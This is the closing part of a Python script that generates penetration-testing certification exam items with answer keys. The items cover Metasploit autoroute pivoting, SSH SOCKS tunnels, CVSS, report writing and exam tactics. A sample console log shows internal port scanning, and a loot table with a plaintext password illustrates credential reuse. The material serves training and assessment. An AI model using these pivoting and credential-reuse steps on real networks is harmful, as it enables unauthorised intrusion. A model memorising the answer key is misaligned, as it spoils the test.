    0, ["Without proxy_dns, hostnames are resolved locally by the tester's OS nameserver, which fails for internal domain names and leaks intelligence to perimeter monitors.", "Proxying DNS actually adds slight latency and does not accelerate port scanning.", "Target domain controller logging is unaffected by client proxy configuration.", "proxy_dns does not alter IP version addressing."],
    "The 'proxy_dns' option forces domain name lookups through the proxy tunnel, ensuring internal hostnames resolve correctly within the target network and preventing DNS queries from leaking onto public or monitored perimeter networks.")

add_log("kb-pentest-112", "M10", "pentest-r1-m10-internal-subnet-routing-01", "P120", "pentest_internal_routing", 3,
    "msf6 post(multi/manage/autoroute) > run\n\n[+] Added route to 10.50.0.0/255.255.255.0 via session 1\n[*] Route added to subsystem.\nmsf6 post(multi/manage/autoroute) > use auxiliary/scanner/portscan/tcp\nmsf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.50.0.100\nmsf6 auxiliary(scanner/portscan/tcp) > run\n\n[+] 10.50.0.100:22 - TCP OPEN\n[+] 10.50.0.100:80 - TCP OPEN",
    "Reviewing the Metasploit console commands and output above, what technique was executed to discover open ports on 10.50.0.100?",
    ["Internal subnet routing via Metasploit's 'autoroute' post-exploitation module through Session 1, followed by scanning through the routed session", "Direct physical cable connection from the attacker machine to 10.50.0.100", "ARP spoofing poisoning the gateway router", "DNS zone transfer extracting all A records"],
    0, ["'autoroute' registered 10.50.0.0/24 in Metasploit's internal routing table, routing all subsequent framework modules (such as portscan/tcp) through Session 1.", "The attacker is routing through an existing meterpreter session, not connecting physical hardware.", "The output shows routing table modification and TCP port scanning, not layer-2 ARP cache poisoning.", "The scan targeted an IP address directly using TCP SYN/connect probes, not a DNS AXFR query."],
    "Metasploit's 'autoroute' module injects routes into Metasploit's internal routing table, enabling any Metasploit scanner or exploit module to transparently route packets through the active session to internal hosts.")

add_multi("kb-pentest-113", "M10", "pentest-r1-m10-ssh-port-forwarding-tunnels-01", "P57", "pentest_pivoting", 3,
    "Which of the following conditions must be satisfied on a dual-homed Linux pivot host to successfully establish an SSH dynamic SOCKS proxy tunnel? (Select all that apply)",
    ["The attacker must possess valid credentials or an SSH private key for a user account on the pivot host", "The pivot host's SSH server configuration (/etc/ssh/sshd_config) must allow TCP port forwarding (AllowTcpForwarding yes)", "Network connectivity must exist between the attacker machine and the pivot host on the SSH listening port", "The pivot host must be running a Microsoft Windows kernel"],
    [0, 1, 2], ["SSH authentication requires either valid account passwords, authorized keys, or an active session.", "If 'AllowTcpForwarding' is set to 'no' in sshd_config, SSH drops all port forwarding and SOCKS proxy requests.", "TCP transport connectivity must exist between the client and the SSH daemon.", "Linux hosts run Linux kernels, not Microsoft Windows kernels."],
    "Establishing an SSH SOCKS proxy requires reachable SSH network connectivity, valid authentication material, and an SSH daemon configuration that permits TCP forwarding ('AllowTcpForwarding yes').")

# --- M11: Reporting & Remediation (7 items) ---
add_log("kb-pentest-114", "M11", "pentest-r1-m11-findings-writeup-cvss-01", "P62", "pentest_findings_documentation", 2,
    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nBase Score: 9.8 (Critical)",
    "Review the CVSS v3.1 vector string above. What combination of attack vector and privilege requirement metrics produces this Critical severity rating?",
    ["Network attack vector (AV:N) with None privileges required (PR:N)", "Local attack vector (AV:L) with High privileges required (PR:H)", "Physical attack vector (AV:P) with Low privileges required (PR:L)", "Adjacent network attack vector (AV:A) with None privileges required (PR:N)"],
    0, ["'AV:N' represents Network accessibility (remotely exploitable across the internet), and 'PR:N' indicates zero privileges required beforehand.", "AV:L requires local shell access, which reduces the base score significantly.", "AV:P requires physical hardware access, resulting in a much lower exploitability rating.", "AV:A specifies an adjacent link-layer network (e.g. local subnet/Wi-Fi), not AV:N."],
    "The vector string 'AV:N/AC:L/PR:N/UI:N' defines a vulnerability that is remotely exploitable over the network (AV:N), with low complexity (AC:L), requiring no credentials (PR:N) and no user interaction (UI:N), producing a 9.8 Critical score.")

add_mcq("kb-pentest-115", "M11", "pentest-r1-m11-findings-writeup-cvss-01", "P63", "pentest_reporting", 1,
    "Which set of components must be included in every technical vulnerability finding within a professional penetration test report deliverable?",
    ["Vulnerability title, affected asset inventory, CVSS v3.1 score, detailed reproduction steps/proof of concept, and actionable remediation guidance", "A list of the penetration tester's favorite movies and hobbies", "The client's stock market trading ticker and quarterly revenue forecasts", "A copy of the complete binary source code of the Metasploit Framework"],
    0, ["Industry standards (PTES, CREST) mandate findings contain title, scope identifiers, severity scoring, step-by-step reproduction proof, and specific remediation advice.", "Personal interests are unprofessional and have no place in business reports.", "Financial stock projections are outside the scope of technical security assessments.", "Vendor tool source code is irrelevant to client vulnerability remediation."],
    "Every finding must provide actionable value: a clear description of the flaw, affected hosts/endpoints, standardized risk rating (CVSS), verifiable proof of concept (PoC), and engineering remediation guidance.")

add_mcq("kb-pentest-116", "M11", "pentest-r1-m11-executive-summary-remediation-01", "P64", "pentest_remediation_strategy", 1,
    "What is the primary target audience and objective of the Executive Summary section in a penetration test report?",
    ["C-suite executives and board members; communicating business risk, overall security posture trends, and strategic remediation priorities without technical jargon", "Junior programmers; providing line-by-line code patches and compiler flags", "Network firewall firmware developers; explaining layer-2 packet headers", "External marketing agencies; designing advertising campaigns"],
    0, ["Executive summaries translate technical findings into business impact, regulatory risk, and strategic resourcing recommendations for leadership.", "Line-by-line technical details belong in technical finding annexes for developers, not the executive summary.", "Firewall firmware engineering details are irrelevant to corporate leadership.", "Marketing agencies do not consume penetration test deliverables."],
    "The Executive Summary is written for non-technical stakeholders (CEO, CFO, CISO, Board), summarizing organizational risk exposure, systemic security weaknesses, and high-level strategic remediation priorities.")

add_mcq("kb-pentest-117", "M11", "pentest-r1-m11-executive-summary-remediation-01", "P94", "pentest_remediation_strategy", 2,
    "In risk-based remediation prioritization, why should an organization prioritize patching an unauthenticated High vulnerability on an internet-facing perimeter router over a Critical vulnerability on an isolated internal test machine?",
    ["Remediation prioritization must account for asset exposure, asset criticality, and threat actor accessibility, not CVSS base scores alone", "Perimeter routers are cheaper to replace than test servers", "Internal vulnerabilities are illegal to patch under international cyber laws", "High vulnerabilities always take alphabetical precedence over Critical vulnerabilities"],
    0, ["Contextual risk combines technical severity with likelihood of exploitation; perimeter assets face continuous automated attacks, while isolated lab assets have minimal threat exposure.", "Equipment replacement cost does not dictate technical patching priority.", "There are no laws prohibiting patching internal vulnerabilities.", "Critical vulnerabilities represent higher technical severity than High vulnerabilities."],
    "Contextual risk analysis evaluates vulnerability severity alongside asset exposure. A perimeter device exposed to the public internet presents a much higher immediate probability of compromise than an air-gapped internal test environment.")

add_mcq("kb-pentest-118", "M11", "pentest-r1-m11-remediation-validation-retesting-01", "P95", "pentest_remediation_validation", 2,
    "During a remediation retesting engagement, what methodology must the penetration tester follow?",
    ["Execute the exact reproduction payloads and test cases used during the initial test to verify that the flaw is eradicated and test for basic defensive bypasses", "Perform an entirely new full-scope penetration test across all out-of-scope assets", "Assume the client's internal engineering team fixed the issue without running tests", "Attempt to deploy ransomware on the target servers to verify data backups"],
    0, ["Retesting rigorously reproduces original findings against patched systems, ensuring the patch is effective and cannot be trivially circumvented.", "Retesting is scoped specifically to original reported findings, not arbitrary out-of-scope assets.", "Assuming fixes without empirical testing violates professional duty of care.", "Deploying ransomware is destructive, criminal, and completely out of scope."],
    "Remediation verification requires re-executing original proof-of-concept tests and edge-case variations against the hardened target to empirically confirm the vulnerability has been resolved without introducing regression flaws.")

add_multi("kb-pentest-119", "M11", "pentest-r1-m11-evidence-collection-scrubbing-01", "P123", "pentest_evidence_sanitization", 2,
    "Which of the following sensitive data types must be redacted or sanitized (scrubbed) from screenshots and command logs before delivering a penetration test report to a client? (Select all that apply)",
    ["Personally Identifiable Information (PII) such as patient health records or Social Security numbers", "Customer credit card numbers and financial transaction records", "Live plaintext corporate production credentials and private API keys", "The hostname of the penetration testing company"],
    [0, 1, 2], ["Regulatory frameworks (HIPAA, GDPR) strictly penalize unencrypted storage or transmission of PII in reports.", "Payment Card Industry (PCI-DSS) standards mandate masking card numbers and sensitive cardholder data.", "Hardcoded production passwords and API keys must be masked to prevent reports from becoming secondary compromise vectors.", "The testing firm's company name is standard branding on deliverable covers and executive summaries."],
    "Evidence sanitization requires permanently masking sensitive client records (PII, PHI, financial records, credit cards) and live production passwords in report artifacts to maintain regulatory compliance and data confidentiality.")

add_short("kb-pentest-120", "M11", "pentest-r1-m11-remediation-validation-retesting-01", "P124", "pentest_remediation_validation", 1,
    "What is the standard name of the formal executive document issued by a penetration testing firm following verification that certifies which findings have been remediated, partially fixed, or remain open?",
    ["closeout letter", "retesting letter", "retest letter", "remediation closeout letter"],
    "A Remediation Closeout Letter (or Retest Attestation Letter) provides external auditors and compliance regulators with formal third-party confirmation of an organization's remediation status.")

# --- M12: Capstone & eJPT Exam Strategy (4 items) ---
add_mcq("kb-pentest-121", "M12", "pentest-r1-m12-ejpt-exam-strategy-tactics-01", "P100", "pentest_exam_strategy", 1,
    "In practical, performance-based penetration testing exams (such as the eJPT), why is reading all assessment questions before executing initial network scans a vital strategic tactic?",
    ["It reveals key target hostnames, interesting port numbers, scope boundaries, and specific flags, enabling focused, goal-driven enumeration", "It automatically submits correct answers to the grading portal", "It disables the exam timer during the assessment", "It allows the student to bypass the virtual lab environment entirely"],
    0, ["Exam questions often reference specific service versions, database names, or user accounts, guiding the candidate's enumeration toward scored objectives.", "Reading questions does not automatically answer or grade them.", "Exam timers continue running uninterrupted.", "Hands-on exam questions require proving answers through lab exploration."],
    "Reviewing all exam questions at the start provides an assessment roadmap, highlighting high-value target assets, expected file paths, and target services to avoid wasting time on rabbit holes.")

add_mcq("kb-pentest-122", "M12", "pentest-r1-m12-ejpt-exam-strategy-tactics-01", "P98", "pentest_exam_strategy", 2,
    "What does the 45-minute timeboxing heuristic dictate when a candidate encounters an exploit path that is failing during a practical exam?",
    ["If no verifiable progress is achieved after 45 minutes on a specific exploit vector, pause, document the attempt, and revert to broad enumeration to identify alternative attack vectors", "Continuously rerun the exact same exploit script until the lab environment crashes", "Submit a technical support ticket claiming the exam is defective", "Immediately exit the exam and forfeit the certification attempt"],
    0, ["Timeboxing prevents getting stuck in 'rabbit holes' by enforcing methodical discipline: step back, review notes, and re-examine initial port scan and enumeration data.", "Repeatedly executing failing exploits wastes critical time and can destabilize target daemons.", "Assuming technical failure rather than re-evaluating enumeration is a common candidate error.", "Forfeiting after 45 minutes is defeatist; practical exams allow ample time (e.g. 48 hours) to explore alternate paths."],
    "The 45-minute timeboxing rule prevents rabbit hole fixation. If an exploitation path stalls for 45 minutes, disciplined testers step back to re-evaluate enumeration data and explore unexamined services.")

add_log("kb-pentest-123", "M12", "pentest-r1-m12-ejpt-exam-strategy-tactics-01", "P99", "pentest_exam_strategy", 2,
    "Target Loot Matrix:\nHost: 10.10.10.10  | Service: HTTP | User: webadmin  | Plain: Spring2024!  | Role: Web CMS Admin\nHost: 10.10.10.20  | Service: SSH  | User: devops    | Plain: [UNKNOWN]    | Hash: $6$aB... (Cracking)\nHost: 10.10.10.30  | Service: SMB  | User: [PENDING] | NTLM: [PENDING]     | Role: Internal File Server",
    "Review the engagement loot tracking matrix above. Following credential harvesting on 10.10.10.10, what is the logical next tactical step?",
    ["Test the discovered plaintext password 'Spring2024!' against other discovered services (such as SSH on 10.10.10.20 or SMB on 10.10.10.30) to check for credential reuse", "Delete the webadmin account from 10.10.10.10", "Conclude the penetration test because one password was found", "Launch a denial of service attack against 10.10.10.20"],
    0, ["Systematic credential reuse testing across discovered endpoints frequently yields rapid lateral movement and elevated footholds.", "Deleting user accounts violates testing rules of engagement and disrupts target systems.", "Finding one credential is only an initial milestone in a multi-host engagement.", "Denial of service attacks violate standard RoE boundaries and offer no assessment intelligence."],
    "Maintaining a Credential Loot Matrix allows systematic auditing of credential reuse across the environment, testing discovered passwords against adjacent hosts and services to achieve lateral movement.")

add_multi("kb-pentest-124", "M12", "pentest-r1-m12-capstone-e2e-01", "P125", "pentest_exam_strategy", 3,
    "Which of the following phases represent necessary tactical progression in a full-scope multi-tier simulated penetration test capstone? (Select all that apply)",
    ["Validating scoped CIDR targets and verifying written Rules of Engagement", "Active service enumeration and identifying exploitable misconfigurations on the perimeter foothold host", "Establishing internal network routes or SOCKS tunnels through dual-homed hosts to discover and exploit backend targets", "Publishing client customer credit card numbers on public social media forums"],
    [0, 1, 2], ["Scope validation and RoE compliance are the legal foundation of every assessment.", "Active service enumeration and exploitation provide initial access footholds.", "Pivoting through dual-homed hosts enables testing isolated internal enterprise networks.", "Publishing confidential customer data publicly is criminal conduct and completely antithetical to ethical security assessments."],
    "A complete professional penetration test progresses methodically: scoping and RoE validation -> reconnaissance & service enumeration -> foothold exploitation -> privilege escalation & pivoting -> technical finding documentation and reporting.")

# Output intermediate JSON
with open("content/pentest/exams/bank_temp.json", "w") as f:
    json.dump(data, f, indent=2)

print(f"Generated {len(data['items'])} items in content/pentest/exams/bank_temp.json")
